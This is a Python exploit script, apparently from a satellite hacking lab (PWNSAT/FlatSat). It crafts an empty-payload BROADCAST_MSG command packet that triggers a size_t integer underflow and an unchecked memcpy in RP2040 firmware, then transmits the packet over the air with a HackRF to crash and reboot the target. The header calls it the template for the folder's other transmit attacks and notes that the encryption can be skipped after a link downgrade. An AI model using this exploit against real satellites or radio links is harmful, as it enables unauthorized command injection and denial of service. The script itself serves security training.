#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_fuzzing_crash_rf.py -- BROADCAST_MSG integer underflow (dossier section
# 03, finding #10, CRITICAL). Root cause: commandApidHandler's
# BROADCAST_MSG branch (worker.cpp, APID 0x06) computes
#
#     size_t msg_len = payload_total - 2;
#
# where payload_total is the DECRYPTED payload's declared size (1, the
# smallest this firmware's own CCSDS length-field convention can express --
# see command_registry.py's note on finding #9, an empty logical payload
# still declares length 1). size_t is unsigned, so 1 - 2 wraps around to
# ~4.29 billion instead of going negative. That value is handed straight
# to `memcpy(buffer_msg, space_packet->data + 2, msg_len)` with no bounds
# check in between -- the RP2040 hard-faults and reboots.
#
# One packet, no retries, no timing -- this is also the template every
# other TX attack in this folder follows (build packet, encrypt, hand to
# pwnsat_lora_tx.transmit_packet). If you understand this script you
# understand 03/06/07 too.
#
# Needs a Python with gnuradio importable -- run it and this script will
# say so with concrete next steps if you've got the wrong one, see
# require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3) for why there's no single
# right interpreter path across every machine:
#   ./02_fuzzing_crash.py
#   ./02_fuzzing_crash.py --encrypt=off   # skip AES (link must be downgraded first, see 04)
#
# Expected result on the FlatSat's serial console: output freezes
# mid-line, then the USB CDC ports drop and re-enumerate a few seconds
# later (hard fault -> reset, not the clean RESETC LED pattern -- see 07
# for that contrast). On PWNSAT-C3: REBOOT DETECTED, uptime resets to 0.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import build_command_packet  # noqa: E402 -- pure packet building, no gnuradio needed

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=47, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    # payload_hex overrides "broadcast"'s normal frequency+message payload
    # construction (see usb_tc_send.build_logical_payload) with an empty
    # one -- that's the whole exploit, there's nothing else to craft.
    raw_spp = build_command_packet(
        "broadcast", seq=args.seq, encrypt=(args.encrypt == "on"), payload_hex=b""
    )

    print(f"[*] BROADCAST_MSG packet with a 0-byte payload ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")
    print("[*] This is the entire exploit -- msg_len = payload_total - 2 underflows "
          "to ~4.29 billion on the firmware side once this decrypts to 0 bytes.")
    print(f"[*] Transmitting on {args.frequency / 1e6:.3f} MHz via {args.device_args} "
          f"(gain={args.gain} dB)...")

    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    tx_gain=args.gain, verbose=not args.quiet)

    print("[+] Sent. Check the FlatSat's serial console / PWNSAT-C3 for a crash+reboot.")


if __name__ == "__main__":
    main()
